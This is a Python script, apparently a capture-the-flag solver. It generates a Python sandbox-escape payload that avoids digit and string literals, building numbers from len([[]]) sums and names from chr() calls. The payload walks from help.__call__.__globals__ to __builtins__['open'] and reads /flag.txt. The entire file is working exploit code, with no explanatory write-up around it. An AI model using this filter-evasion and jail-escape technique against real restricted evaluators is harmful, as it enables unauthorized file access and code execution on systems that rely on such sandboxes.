import math

def generate_number(n):
    if n == 0:
        return "len([])"
    elif n == 1:
        return "len([[]])"
    elif n <= 20:
        return "+".join(["len([[]])" for _ in range(n)])
    else:
        base = "len([[]])"
        sqrt_n = int(math.sqrt(n))
        best_len = float('inf')
        best_expr = None
        
        for a in range(max(2, sqrt_n - 5), min(n, sqrt_n + 6)):
            if a > n:
                break
            b = n // a
            remainder = n % a
            
            if b <= 20 and remainder <= 20:
                if a <= 20:
                    a_expr = "+".join([base] * a)
                else:
                    continue
                    
                if b > 1:
                    b_expr = "+".join([base] * b)
                    expr = f"({a_expr})*({b_expr})"
                else:
                    expr = a_expr
                
                if remainder > 0:
                    r_expr = "+".join([base] * remainder)
                    expr = f"({expr}+{r_expr})"
                
                expr_len = len(expr)
                if expr_len < best_len:
                    best_len = expr_len
                    best_expr = expr
        
        if best_expr is None:
            ten = f"({'+'.join([base]*10)})"
            tens = n // 10
            ones = n % 10
            
            if tens > 0 and ones > 0:
                tens_mult = f"({'+'.join([base]*tens)})"
                tens_part = f"{ten}*{tens_mult}" if tens > 1 else ten
                ones_part = "+".join([base]*ones)
                return f"({tens_part}+{ones_part})"
            elif tens > 0:
                tens_mult = f"({'+'.join([base]*tens)})"
                return f"{ten}*{tens_mult}" if tens > 1 else ten
            else:
                return "+".join([base]*ones)
        
        return best_expr

# Test
print("Testing optimized number generation:")
for n in [95, 110, 47, 115]:
    expr = generate_number(n)
    print(f"{n}: len={len(expr)}, result={eval(expr)}")

# Test full payload
def build_chr_string(s):
    return "+".join([f"chr({generate_number(ord(c))})" for c in s])

str_call = build_chr_string("__call__")
str_globals = build_chr_string("__globals__")
str_builtins = build_chr_string("__builtins__")
str_open = build_chr_string("open")
str_flag = build_chr_string("/flag.txt")
str_read = build_chr_string("read")

payload = f"getattr(getattr(getattr(help,{str_call}),{str_globals})[{str_builtins}][{str_open}]({str_flag}),{str_read})()"

print(f"\nOptimized payload length: {len(payload)}")
print(f"Preview: {payload[:100]}...")
